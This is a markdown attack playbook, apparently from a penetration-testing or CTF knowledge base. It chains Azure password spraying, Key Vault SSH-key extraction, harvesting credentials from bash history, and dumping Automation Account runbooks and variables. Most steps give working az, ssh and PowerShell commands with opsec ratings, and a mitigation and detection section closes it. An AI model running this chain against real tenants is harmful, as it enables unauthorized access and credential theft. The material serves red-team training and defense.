# Azure: Credential Spray → Automation Secrets Exfil

**Severity:** High  
**Entry Point:** UPN password spray (leaked credential or internal discovery)  
**Target:** Azure subscription with Automation Account containing secrets/credentials  
**Outcome:** Flag capture + privileged credential extraction

---

## Chain: UPN Spray → VM Access → Bash History → Automation Secrets

### [1] UPN Generation + Password Spray via oh365userfinder
**Input:** Employee names (from public sources) + candidate password (pastebin, config leak, internal discovery)  
**Technique:** `oh365userfinder.py --pwspray` respects Azure Smart Lockout (1 password per account per cycle)  
**Output:** Valid UPN + password for initial Azure AD user (e.g., `jsmith@target.com:CorpPass2024!`)  
**Opsec:** Med (logged in Entra Sign-In logs; multiple failed attempts may trigger Smart Lockout)

**Trigger:** Employee names leaked on About Us page, LinkedIn, or app pages + password found in pastebin/source code/configuration artifact

---

### [2] Azure Resource & Role Enumeration
**Input:** Valid UPN + password authenticated via `az login`  
**Technique:** `az resource list` + `az role assignment list --all` (not `--assignee`)  
**Output:** 
- Enumerated resources: VMs, Key Vaults, Automation Accounts, Storage Accounts
- Enumerated RBAC: `Key Vault Secrets User`, `Reader`, `Website Contributor`, etc.
- High-value targets identified (Key Vaults with secrets, VMs with SSH keys, Automation Accounts)

**Opsec:** Low (enumeration is noisy but rarely alerted on)

---

### [3] SSH Key Extraction from Azure Key Vault
**Input:** `Key Vault Secrets User` RBAC role on a vault; vault contains SSH key secret (named after target VM)  
**Technique:**
```bash
az keyvault secret list --vault-name <VAULT> --query "[].name" -o tsv
az keyvault secret show --vault-name <VAULT> --name <AUTOMAT01> --query value -o tsv > vm_sshkey.pem
chmod 600 vm_sshkey.pem
```
**Output:** SSH private key for VM admin access (e.g., automation user on Linux VM)  
**Opsec:** Low (Key Vault read is RBAC-logged but not typically alerted)

---

### [4] SSH Shell on Azure VM
**Input:** SSH private key + VM public IP (from `az vm show -d`)  
**Technique:** `ssh -i vm_sshkey.pem automation@<PUBIP>`  
**Output:** Interactive shell on VM as `automation` user  
**Opsec:** Med (SSH connection is logged; successful auth is not anomalous if IP appears to be corporate)

---

### [5] Bash History Credential Harvesting
**Input:** Interactive shell on VM  
**Technique:** `cat ~/.bash_history` — search for `az login` commands containing plaintext credentials  
**Output:** New Azure AD credentials (UPN + password) for higher-privileged user
- Example: `az login -u "asmith@target.com" -p "<harvested_password>"`
- New user often has broader RBAC than initial spray target

**Opsec:** Low (bash_history access is not monitored; reading own history is normal)

---

### [6] Re-authenticate as Elevated User
**Input:** New UPN + password harvested from bash_history  
**Technique:** `az logout` → `az login -u "<harvested_upn>" -p "<harvested_password>"`  
**Output:** Authenticated session as higher-privilege user  
**Context:** New user often has Automation Account access, Storage permissions, or broader RBAC

**Opsec:** Low (new interactive login is normal; SmartLockout only triggers on repeated failures per account)

---

### [7] Automation Account Discovery & Enumeration
**Input:** Authenticated session as elevated user  
**Technique:**
```bash
az automation account list --query "[].name" -o tsv
az automation runbook list --automation-account-name <ACCOUNT> --resource-group <RG> -o table
```
**Output:** 
- List of Automation Accounts in subscription
- List of runbooks in each account (e.g., Schedule-VMStartStop)
- Resource IDs for subsequent access

**Opsec:** Low

---

### [8] Automation Runbook Script Extraction via PowerShell
**Input:** Authenticated PowerShell session (from new user) + Reader role on Automation Account  
**Technique:**
```bash
Connect-AzAccount
Export-AzAutomationRunbook -ResourceGroupName <RG> -AutomationAccountName <ACCOUNT> \
  -Name <RUNBOOK_NAME> -Output . -Force
```
**Output:** Full runbook PowerShell script containing:
- Service principal authentication logic (AzureRunAsConnection)
- API calls and conditional flows
- Hardcoded secrets, API endpoints, or privilege escalation paths
- AzureRunAs credentials embedded in the script or referenced in the automation account

**Opsec:** Low (runbook export is a standard administrative operation)

---

### [9] Automation Account Credential + Variable Harvesting
**Input:** Reader role on Automation Account + PowerShell  
**Technique:**
```bash
Get-AzAutomationCredential -ResourceGroupName <RG> -AutomationAccountName <ACCOUNT> | 
  Select-Object Name, UserName
Get-AzAutomationVariable -ResourceGroupName <RG> -AutomationAccountName <ACCOUNT> | 
  Format-Table Name, Value -AutoSize
Get-AzAutomationConnection -ResourceGroupName <RG> -AutomationAccountName <ACCOUNT>
```
**Output:**
- Plaintext credentials (username, password pairs) → re-use for lateral movement or persistence
- Plaintext variables containing:
  - **Flags** (CTF objectives)
  - **Passwords** for databases, service accounts, privileged users
  - **API keys** and OAuth tokens
  - **Connection strings** with embedded credentials
- Automation connections with service principal details (ApplicationId, TenantId, CertificateThumbprint)

**Example output:**
```
Name       Value
----       -----
Flag       <ctf_flag_value>
Password   <plaintext_password_value>
```

**Opsec:** Low (credential/variable read is RBAC-logged; Reader role is not suspicious)

---

## Attack Flow Summary

```
[Initial Access]
    ↓
Leaked Password + Employee Name List
    ↓
[1] UPN Spray (oh365userfinder)
    ↓ Valid Credentials
[2] Enumerate Roles & Resources
    ↓ Key Vault Secrets User role identified
[3] Extract SSH Key from Key Vault
    ↓ SSH private key retrieved
[4] SSH into VM
    ↓ Shell as automation user
[5] Bash History Credential Harvest
    ↓ New user credentials discovered
[6] Re-authenticate as elevated user
    ↓ Elevated Azure session
[7] Discover Automation Account    ↓ Automation Account resource enumerated
[8] Export Runbook Script
    ↓ Service principal auth logic revealed
[9] Harvest Automation Variables
    ↓
[FLAG CAPTURED + PRIVILEGED CREDENTIALS HARVESTED]
```

---

## Mitigation & Detection

### Prevention
1. **Disable plaintext bash_history** in VM startup scripts; use Auditd instead
2. **Enforce MFA** on all Azure AD accounts (no bypass for internal IPs)
3. **Rotate Automation Account credentials** regularly; use managed identities instead
4. **Never store flags/passwords in Automation variables** — use Key Vault with access restricted by RBAC
5. **Implement Conditional Access policies** to block risky sign-in locations
6. **Enable Azure Activity Logging** and alert on runbook exports and variable reads

### Detection
1. **Azure Sign-In Logs:** Multiple failed UPN spray attempts from external IP
2. **Azure Activity Log:** `Export-AzAutomationRunbook` commands; `Get-AzAutomationVariable` reads from non-standard accounts
3. **SSH Logs (syslog):** SSH login from unexpected source; high-privilege user accessing sensitive shell history
4. **Entra Sign-In Logs:** Impossible travel (initial user in one location, harvested user authenticating from different country minutes later)

---

## References
- Technique: [Azure UPN Generation + Password Spray via oh365userfinder](../Cloud/Azure_Attacks.md)
- Technique: [Azure SSH Key Extraction from Key Vault for VM Access](../Cloud/Azure_Attacks.md)
- Technique: [Azure Automation Runbook Script Extraction via PowerShell](../Cloud/Azure_Attacks.md)
- Technique: [Azure Automation Account Credential + Variable Harvesting](../Cloud/Azure_Attacks.md)
